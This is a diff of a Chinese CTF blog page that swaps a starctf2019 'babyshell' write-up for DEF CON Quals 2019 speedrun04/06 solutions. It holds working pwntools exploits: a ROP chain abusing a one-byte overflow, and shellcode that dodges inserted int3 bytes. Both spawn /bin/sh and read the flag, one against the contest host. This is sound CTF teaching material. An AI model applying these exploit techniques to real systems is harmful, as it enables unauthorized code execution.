@@ -108,24 +108,24 @@
 
 
 
-  <meta name="description" content="介绍starctf2019的一道题，出题人想出的有点挑战，奈何代码出现了失误，很容易就被绕过了。">
+  <meta name="description" content="介绍DefconQuals2019，难题基本不会，做了几道简单的speedrun04、speedrun06">
 <meta property="og:type" content="article">
-<meta property="og:title" content="starctf2019-babyshell">
-<meta property="og:url" content="https://mf-x.github.io/2019/05/05/starctf2019-babyshell/index.html">
+<meta property="og:title" content="DefconQuals2019-speedrun04-06">
+<meta property="og:url" content="https://mf-x.github.io/2019/05/13/DefconQuals2019-speedrun04-06/index.html">
 <meta property="og:site_name" content="ivan">
-<meta property="og:description" content="介绍starctf2019的一道题，出题人想出的有点挑战，奈何代码出现了失误，很容易就被绕过了。">
+<meta property="og:description" content="介绍DefconQuals2019，难题基本不会，做了几道简单的speedrun04、speedrun06">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-05-05T04:42:07.822Z">
+<meta property="og:updated_time" content="2019-05-13T12:41:09.793Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="starctf2019-babyshell">
-<meta name="twitter:description" content="介绍starctf2019的一道题，出题人想出的有点挑战，奈何代码出现了失误，很容易就被绕过了。">
+<meta name="twitter:title" content="DefconQuals2019-speedrun04-06">
+<meta name="twitter:description" content="介绍DefconQuals2019，难题基本不会，做了几道简单的speedrun04、speedrun06">
 
 
 
 
 
 
-  <link rel="canonical" href="https://mf-x.github.io/2019/05/05/starctf2019-babyshell/">
+  <link rel="canonical" href="https://mf-x.github.io/2019/05/13/DefconQuals2019-speedrun04-06/">
 
 
 
@@ -135,7 +135,7 @@
   };
 </script>
 
-  <title>starctf2019-babyshell | ivan</title>
+  <title>DefconQuals2019-speedrun04-06 | ivan</title>
   
 
 
@@ -329,7 +329,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://mf-x.github.io/2019/05/05/starctf2019-babyshell/">
+    <link itemprop="mainEntityOfPage" href="https://mf-x.github.io/2019/05/13/DefconQuals2019-speedrun04-06/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="ivan Mo">
@@ -346,7 +346,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">starctf2019-babyshell
+          <h1 class="post-title" itemprop="name headline">DefconQuals2019-speedrun04-06
               
             
           </h1>
@@ -371,7 +371,7 @@
                 
               
 
-              <time title="Created: 2019-05-05 12:34:17 / Modified: 12:42:07" itemprop="dateCreated datePublished" datetime="2019-05-05T12:34:17+08:00">2019-05-05</time>
+              <time title="Created: 2019-05-13 19:47:26 / Modified: 20:41:09" itemprop="dateCreated datePublished" datetime="2019-05-13T19:47:26+08:00">2019-05-13</time>
             
 
             
@@ -409,13 +409,18 @@
       
 
       
-        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>starctf2019的一道题，出题人想出的有点挑战，奈何代码出现了失误，很容易就被绕过了。</p>
+        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>DefconQuals2019，难题基本不会，做了几道简单的speedrun04、speedrun06</p>
 <a id="more"></a>
-<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>程序很简单，读入shellcode，做检查，check过了就执行shellcode。</p>
-<p>这个检查规定了你的shellcode必须为指定的字符，但是检查到’\x00’就停止检查，所以很容易被绕过。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">check</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *j; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = a1; *i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = table; *j &amp;&amp; *j != *i; ++j )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !*j )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>我们需要产生一个’\x00’来绕过检查，很容易想到的就是push 0，或者pop 0。而push 0正好是’j\x00’，而’j’在允许的table表中，所以在shellcode前面加上push 0即可。</p>
-<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./shellcode'</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(<span class="string">'push 0'</span>) + asm(shellcraft.amd64.sh(),arch=<span class="string">'amd64'</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="speedrun04"><a href="#speedrun04" class="headerlink" title="speedrun04"></a>speedrun04</h3><p>静态编译，而且strip了，所以可能找不到主函数。找一下字符串，看一下引用就能找到了。</p>
+<p>程序很简单，读入长度，然后read读。</p>
+<p>漏洞点在长度最多为257，而read所写的buffer只有256长，有一个字节的溢出。</p>
+<p>这个溢出将会改掉rbp，所以ret之后栈的内容可以被我们控制。</p>
+<p>因为有aslr，所以栈是随机的，改掉最后一位后，栈的位置也不能完全控制（把最后一位写成\x00可以控制栈往前移），所以我们rop的前面需要padding一部分。（脚本见最后）</p>
+<h3 id="speedrun06"><a href="#speedrun06" class="headerlink" title="speedrun06"></a>speedrun06</h3><p>程序很简单，读入shellcode后直接运行，但是会对你的shellcode进行一定的处理。</p>
+<p>首先会会在前面加一段code，清空除rip外的寄存器；其次会在0x5、0xa、0x14、0x1d这四个位置插入一个0xcc也就是int3。</p>
+<p>利用方式，对于寄存器清零，我们可以直接调用syscal，这样rcx会被置为rip；其次对于0xcc，我们选择用jmp跳过去（开gdb的时候你会发现0xcc没影响，不要被它隔断shellcode就好，但是一打远程就会发现会在0xcc处断掉，所以必须jmp过去）（脚本见最后）</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># speedrun04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(binary)</span></span><br><span class="line">p = remote(<span class="string">'speedrun-004.quals2019.oooverflow.io'</span>,<span class="number">31337</span>)</span><br><span class="line"></span><br><span class="line">poprax  = <span class="number">0x0000000000415f04</span></span><br><span class="line">poprdx  = <span class="number">0x000000000044a155</span></span><br><span class="line">poprsi  = <span class="number">0x0000000000410a93</span></span><br><span class="line">poprdi  = <span class="number">0x0000000000400686</span></span><br><span class="line">syscall = <span class="number">0x0000000000474f15</span></span><br><span class="line">bss     = <span class="number">0x6BB300</span></span><br><span class="line">ret     = <span class="number">0x400BD1</span></span><br><span class="line"></span><br><span class="line">rop = [ret] * <span class="number">12</span> + [</span><br><span class="line">    poprax, <span class="number">0</span>,</span><br><span class="line">    poprdi, <span class="number">0</span>,</span><br><span class="line">    poprsi, bss,</span><br><span class="line">    poprdx, <span class="number">8</span>,</span><br><span class="line">    syscall,</span><br><span class="line"></span><br><span class="line">    poprax, <span class="number">59</span>,</span><br><span class="line">    poprdi, bss,</span><br><span class="line">    poprsi, <span class="number">0</span>,</span><br><span class="line">    poprdx, <span class="number">0</span>,</span><br><span class="line">    syscall</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'have to say?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'257'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span>.join(list(map(p64,rop)))</span><br><span class="line">payload = payload.ljust(<span class="number">255</span>,<span class="string">'\x00'</span>) + <span class="string">'\x00\x00'</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># speedrun06</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./speedrun-006'</span></span><br><span class="line">p = process(binary, env=env)</span><br><span class="line"><span class="comment"># p = remote('speedrun-006.quals2019.oooverflow.io',31337)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># jmp '\xeb'</span></span><br><span class="line">shellcode = asm(<span class="string">'syscall'</span>,arch=<span class="string">'amd64'</span>) + <span class="string">'\xeb\x02'</span></span><br><span class="line">shellcode += asm(<span class="string">'nop\n'</span>,arch=<span class="string">'amd64'</span>) + <span class="string">'\xeb\x03'</span></span><br><span class="line">shellcode += asm(<span class="string">'nop\nnop\nmov rsi,rcx\nmov rdx, r11'</span>,arch=<span class="string">'amd64'</span>) + <span class="string">'\xeb\x02'</span></span><br><span class="line">shellcode += asm(<span class="string">'nop\nadd rsi,26\nsyscall'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(shellcode) &lt;= <span class="number">26</span></span><br><span class="line">shellcode = shellcode.ljust(<span class="number">26</span>, <span class="string">'\x90'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Send me your ride\n'</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">shellcode = [<span class="string">'mov rsp,rcx'</span>,<span class="string">'sub rsp,30'</span>,<span class="string">'mov rax, 59'</span>,<span class="string">'mov rdi, rsi'</span>,<span class="string">'add rdi, 29'</span>,<span class="string">'xor rsi, rsi'</span>,<span class="string">'xor rdx, rdx'</span>,<span class="string">'syscall'</span>]</span><br><span class="line">shellcode = asm(<span class="string">'\n'</span>.join(shellcode),arch=<span class="string">'amd64'</span>)</span><br><span class="line">p.send(shellcode + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -443,8 +448,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/05/05/starctf2019-girlfriend/" rel="next" title="starctf2019-girlfriend">
-                <i class="fa fa-chevron-left"></i> starctf2019-girlfriend
+              <a href="/2019/05/05/starctf2019-babyshell/" rel="next" title="starctf2019-babyshell">
+                <i class="fa fa-chevron-left"></i> starctf2019-babyshell
               </a>
             
           </div>
@@ -453,8 +458,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/05/13/DefconQuals2019-speedrun04-06/" rel="prev" title="DefconQuals2019-speedrun04-06">
-                DefconQuals2019-speedrun04-06 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/05/13/DefconQuals2019-speedrun08-09/" rel="prev" title="DefconQuals2019-speedrun08-09">
+                DefconQuals2019-speedrun08-09 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -572,7 +577,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#介绍"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序"><span class="nav-number">2.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用方式"><span class="nav-number">3.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本"><span class="nav-number">4.</span> <span class="nav-text">脚本</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#介绍"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#speedrun04"><span class="nav-number">2.</span> <span class="nav-text">speedrun04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#speedrun06"><span class="nav-number">3.</span> <span class="nav-text">speedrun06</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本"><span class="nav-number">4.</span> <span class="nav-text">脚本</span></a></li></ol></div>
             
 
           </div>
